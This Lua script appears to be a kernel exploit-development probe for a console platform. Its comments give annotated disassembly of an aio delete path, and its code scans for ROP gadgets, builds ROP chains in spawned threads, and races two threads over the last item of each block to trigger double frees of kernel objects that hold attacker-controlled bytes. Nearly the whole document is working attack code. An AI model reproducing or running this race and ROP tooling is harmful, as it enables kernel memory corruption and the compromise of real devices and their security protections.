-- CRASH_CLASS: HIGH
-- PROBE 791a: race the LAST item of a 2-item aio block
--
-- Context: the delete path frees nothing but the work item while a block still
-- has items left (path B at 8ad6ffbc). The LAST item (entry count [T+2] == 1)
-- takes path A instead, which frees the whole object set:
--
--   8ad6fec8  mov rdi,[r14+0x10]      ; C+0x10 = cred ref
--   8ad6fed1  call 0x8ac69670         ; lock xadd [rdi],-1
--   8ad6fed6  mov qword [r14+0x10],0
--   8ad6fede  mov rdi,r14
--   8ad6fee8  call free               ; FREE C  (0x30 context)
--   8ad7009f  mov rdi,[r8+0x10]
--   8ad700a3  call free               ; FREE S  (0x58 status block)
--   8ad700a8  mov rdi,[r12+0x20]
--   8ad700b4  call free               ; FREE D  (descriptor array, user bytes)
--   8ad700b9  mov rdi,[r12+0x28]
--   8ad700c8  call free               ; FREE P  (pointer array)
--   8ad700cd  mov rdi,r12
--   8ad700d3  call free               ; FREE T  (0x30 entry)
--
-- Two callers that both read [T+2] == 1 therefore free all five objects twice,
-- and D is a kernel allocation copied verbatim from the descriptor page, so
-- the doubled set contains attacker-controlled bytes.
--
-- Single-call children never overlap (524a: 0 doubles in 25 attempts) because
-- spawn latency is milliseconds and the window is tens of instructions. Two
-- long loops stay in step instead (523c: 54/100). So this probe builds M
-- blocks of two, deletes every first item serially (leaving each block one
-- item from path A), then walks the M last-item ids from two raw threads in
-- the same order. Every id where both callers report 0 is a candidate double
-- free of that block's C, S, D, P and T.
--
-- Signal: a walk that returns two zeros for one id, then any anomaly in the
-- allocation probe (a create that cannot poll or delete, a status outside
-- {0, 0x80020003}, or a death). A clean probe is not a refutation: 14.10
-- writes 0 on the miss path too, so the double needs the second zero.

print("=== PROBE 791a: aio last-item race ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end
print(string.format("[A] eboot=%X poprax=%X poprdi=%X poprsi=%X poprdx=%X jmp$=%X",
    ebase, pop_rax, pop_rdi, pop_rsi, pop_rdx, jmp_g))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

-- A child starts with RSP = top - 8 and runs the chain upward, so the chain
-- must live above the stack region inside the same allocation (523b ran a
-- long chain past its stack and killed the parent).
local STACK = 0x4000
local function spawn_chain(nids, ids, statpage)
    local chain = STACK
    local block = mmap(chain + nids*10*8 + 0x100)
    local base = block + chain
    local p = base
    for i=1,nids do
        wq(p, uint64(pop_rdi)); wq(p+8,  uint64(ids[i]))
        wq(p+16, uint64(pop_rsi)); wq(p+24, uint64(1))
        wq(p+32, uint64(pop_rdx)); wq(p+40, uint64(statpage + (i-1)*4))
        wq(p+48, uint64(pop_rax)); wq(p+56, uint64(662))
        wq(p+64, uint64(fn))
        p = p + 72
    end
    wq(p, uint64(pop_rax)); wq(p+8, uint64(431))
    wq(p+16, uint64(fn));   wq(p+24, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base - 8))
    wq(ctx+Ctx.RDI, uint64(0));       wq(ctx+Ctx.RSI, uint64(1))
    wq(ctx+Ctx.RDX, uint64(statpage)); wq(ctx+Ctx.RAX, uint64(662))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
-- Descriptor page: one in-bounds descriptor. The worker never runs (submit is
-- gated), so the content only matters as the bytes of D.
for i=0,0x27,8 do wq(data+i, 0) end
wd(data+0x20, 0x2A)   -- fd, unused

local M = 24
local first, last = {}, {}
local made = 0
for k=1,M do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(2), uint64(1), uint64(o)) end)
    if okc and to_num(rvc) == 0 then
        local base = rd(o) or 0
        made = made + 1
        first[made] = base
        last[made]  = base + 0x10000
    end
end
print(string.format("[B] blocks=%d/%d first=%08X last=%08X", made, M, first[1] or 0, last[1] or 0))
if made ~= M then
    for k=made+1,M do last[k] = 0 end
    return
end

-- Leave every block with one item: this is path B, which frees only W.
local fids = mmap(page)
for k=1,M do wd(fids + (k-1)*4, first[k]) end
local fst = mmap(page)
local okd, rvd = pcall(function() return mk(662)(uint64(fids), uint64(M), uint64(fst)) end)
local fz = 0
for k=0,M-1 do if (rd(fst + k*4) or -1) == 0 then fz = fz + 1 end end
print(string.format("[C] first-item deletes: rv=%s zeros=%d/%d", tostring(to_num(rvd)), fz, M))

-- Control: one child walks the last-item list alone.
local ctl = mmap(page)
wd(W, 0)
local okc1, tid1 = spawn_chain(M, last, ctl)
sleep_ms(60)
local cz = 0
for k=1,M do if (rd(ctl + (k-1)*4) or -1) == 0 then cz = cz + 1 end end
print(string.format("[D] control child ok=%s tid=%X zeros=%d/%d (expect %d)", tostring(okc1), tid1, cz, M, M))

-- Rebuild the same shape for the race.
local first2, last2 = {}, {}
for k=1,M do
    local o = mmap(page)
    local ok2, rv2 = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(2), uint64(1), uint64(o)) end)
    if not (ok2 and to_num(rv2) == 0) then print("[E] rebuild create failed at " .. k) return end
    local base = rd(o) or 0
    first2[k] = base
    last2[k]  = base + 0x10000
end
local fids2 = mmap(page)
for k=1,M do wd(fids2 + (k-1)*4, first2[k]) end
local fst2 = mmap(page)
local okd2, rvd2 = pcall(function() return mk(662)(uint64(fids2), uint64(M), uint64(fst2)) end)
print(string.format("[E] rebuilt %d blocks, first deletes rv=%s", M, tostring(to_num(rvd2))))

local sA, sB = mmap(page), mmap(page)
wd(W, 0)
local okA, tidA = spawn_chain(M, last2, sA)
local okB, tidB = spawn_chain(M, last2, sB)
print(string.format("[F] race children ok=%s/%s tids=%X/%X", tostring(okA), tostring(okB), tidA, tidB))
sleep_ms(200)
for i=1,40 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
sleep_ms(100)

local dbl, one, none, oth = {}, 0, 0, {}
for k=1,M do
    local a = rd(sA + (k-1)*4) or 0
    local b = rd(sB + (k-1)*4) or 0
    local za = (a == 0) and 1 or 0
    local zb = (b == 0) and 1 or 0
    if za + zb == 2 then dbl[#dbl+1] = k
    elseif za + zb == 1 then one = one + 1
    else none = none + 1 end
    if (a ~= 0 and a ~= 0x80020003) or (b ~= 0 and b ~= 0x80020003) then
        oth[#oth+1] = string.format("%d:%08X/%08X", k, a, b)
    end
end
print(string.format("[G] ids with two zeros=%d (of %d) one=%d none=%d", #dbl, M, one, none))
if #dbl > 0 then
    local s = {}
    for i=1,math.min(#dbl, 12) do s[#s+1] = dbl[i] end
    print("[G] double ids: " .. table.concat(s, ","))
end
print("[G] unexpected status: [" .. table.concat(oth, " ") .. "]")

-- Allocation probe: fresh count=1 requests must allocate, poll and delete.
local bad = 0
for k=1,8 do
    local o, pp, st = mmap(page), mmap(page), mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(o), uint64(1), uint64(pp)) end)
    wd(st, 0x77777777)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
    local id, ps, ds = rd(o) or 0, rd(pp) or 0, rd(st) or 0
    if not (ok1 and to_num(rv1) == 0 and ok3 and to_num(rv3) == 0 and ds == 0) then bad = bad + 1 end
    print(string.format("[H] %d create=%s/%s poll=%s id=%08X state=%08X del=%s/%08X",
        k, tostring(ok1), tostring(to_num(rv1)), tostring(to_num(rv2)), id, ps,
        tostring(ok3), ds))
end
print(string.format("[I] allocation anomalies=%d/8 alive", bad))

print("=== PROBE 791a DONE ===")
